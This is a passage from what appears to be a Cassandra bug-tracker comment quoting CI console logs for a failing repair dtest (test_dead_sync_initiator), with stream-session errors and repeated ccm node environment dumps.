01:33:03   File ""/home/cassandra/cassandra/cassandra-dtest/dtest_setup.py"", line 136, in _log_error_handler
01:33:03     pytest.fail(""Error details: \n{message}"".format(message=message))
01:33:03   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/_pytest/outcomes.py"", line 97, in fail
01:33:03     raise Failed(msg=msg, pytrace=pytrace)
01:33:03 Failed: Error details: 
01:33:03 Errors seen in logs for: node3
01:33:03 node3: ERROR [Stream-Deserializer-/127.0.0.1:7000-40c50b68] 2022-03-29 23:33:02,774 StreamSession.java:883 - [Stream #926db7b0-afb8-11ec-9acd-3f04cc2f16ba] Remote peer /127.0.0.1:7000 failed stream session.
01:33:03 23:33:15,943 repair_tests.repair_test DEBUG Killed node2, now waiting repair to finish
01:33:20 PASSED
01:33:20 ------------------------------ live log teardown -------------------------------
01:33:20 23:33:15,956 conftest ERROR Unexpected error in node3 log, error: 
01:33:20 ERROR [Stream-Deserializer-/127.0.0.1:7000-40c50b68] 2022-03-29 23:33:02,774 StreamSession.java:883 - [Stream #926db7b0-afb8-11ec-9acd-3f04cc2f16ba] Remote peer /127.0.0.1:7000 failed stream session.
01:33:20 23:33:16,459 dtest_setup DEBUG removing ccm cluster test at: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6
01:33:20 23:33:16,707 dtest_setup DEBUG clearing ssl stores from [/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6] directory
01:33:20 
01:33:20 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator ERROR
01:33:20 
01:33:20 ==================================== ERRORS ====================================
01:33:20 ___________ ERROR at teardown of TestRepair.test_dead_sync_initiator ___________
01:33:20 Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [Stream-Deserializer-/127.0.0.1:7000-40c50b68] 2022-03-29 23:33:02,774 StreamSession.java:883 - [Stream #926db7b0-afb8-11ec-9acd-3f04cc2f16ba] Remote peer /127.0.0.1:7000 failed stream session., ERROR [Stream-Deserializer-/127.0.0.1:7000-40c50b68] 2022-03-29 23:33:02,774 StreamSession.java:883 - [Stream #926db7b0-afb8-11ec-9acd-3f04cc2f16ba] Remote peer /127.0.0.1:7000 failed stream session.]
{noformat}


h5. Cassandra-4.0/372 onheap
Cassandra-4.0/372/testReport/dtest.repair_tests.repair_test/TestRepair/test_dead_sync_initiator/
 --> Cassandra-4.0-dtest/322/label=cassandra-dtest,split=52/
 --> https://nightlies.apache.org/cassandra/cassandra-4.0/Cassandra-4.0-dtest/322/Cassandra-4.0-dtest/label=cassandra-dtest,split=52/

In the stage's console we see 
{noformat}
02:33:08 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator 
02:33:08 -------------------------------- live log setup --------------------------------
02:33:08 00:33:08,607 conftest INFO Starting execution of test_dead_sync_initiator at 2022-03-29 00:33:08.607472
02:33:08 00:33:09,127 dtest_setup INFO cluster ccm directory: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c
02:33:09 00:33:09,261 ccm DEBUG Log-watching thread starting.
02:33:09 -------------------------------- live log call ---------------------------------
02:33:09 00:33:09,261 ccm DEBUG Log-watching thread starting.
02:33:09 00:33:09,267 repair_tests.repair_test DEBUG Setting up cluster..
02:33:09 00:33:11,15 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8195919619676885545,-7104622508984673285,-6260245861493511528,-4819977631590928288,-3748477015250895476,-2730625610508468460,-1912953677896117666,-837197796670538126,-101282103959644486,978090703487957171,2221610709168549143,3188974952247084642,4778979504760983280,6398002800458026577,7376148252974140653,9154782553797727781', '-8639488607763574572,-7582112090834616354,-5460417190832381244,-4201996599688728210,-3137655609915664814,-1317651308935718415,559413020577267612,1728367943756281991,2777491744085473079,3713404916876988499,4129042576448628379,5340722923120609524,5738045775469322315,6996466491414765403,8030767138090169770,8457053639371299160', '-8891748204486643536,-7834191519796594976,-6591753205116462824,-5764906748378349553,-5100398046201091478,-4438266539898850242,-3375914140228498703,-2237787600838603711,-405871871883521028,308423592514139963,1425662043385837557,4497385768075403697,6129866732079667748,6762850555552801871,7740741411946290535,8888065120301967243']
02:33:11 00:33:11,15 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8195919619676885545,-7104622508984673285,-6260245861493511528,-4819977631590928288,-3748477015250895476,-2730625610508468460,-1912953677896117666,-837197796670538126,-101282103959644486,978090703487957171,2221610709168549143,3188974952247084642,4778979504760983280,6398002800458026577,7376148252974140653,9154782553797727781', '-8639488607763574572,-7582112090834616354,-5460417190832381244,-4201996599688728210,-3137655609915664814,-1317651308935718415,559413020577267612,1728367943756281991,2777491744085473079,3713404916876988499,4129042576448628379,5340722923120609524,5738045775469322315,6996466491414765403,8030767138090169770,8457053639371299160', '-8891748204486643536,-7834191519796594976,-6591753205116462824,-5764906748378349553,-5100398046201091478,-4438266539898850242,-3375914140228498703,-2237787600838603711,-405871871883521028,308423592514139963,1425662043385837557,4497385768075403697,6129866732079667748,6762850555552801871,7740741411946290535,8888065120301967243']
02:33:11 00:33:12,75 repair_tests.repair_test DEBUG Setting up byteman on node2
02:33:12 00:33:12,250 repair_tests.repair_test DEBUG Starting cluster..
02:33:12 00:33:12,390 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/conf'}
02:33:12 00:33:12,390 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/conf'}
02:33:12 00:33:12,391 ccm INFO node1: using Java 8 for the current invocation
02:33:12 00:33:12,391 ccm INFO node1: using Java 8 for the current invocation
02:33:12 00:33:12,538 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
02:33:12 00:33:12,538 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
02:33:12 00:33:12,538 ccm INFO node1: using Java 8 for the current invocation
02:33:12 00:33:12,538 ccm INFO node1: using Java 8 for the current invocation
02:33:12 00:33:12,606 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:33:12 00:33:12,606 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:33:12 00:33:12,831 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': 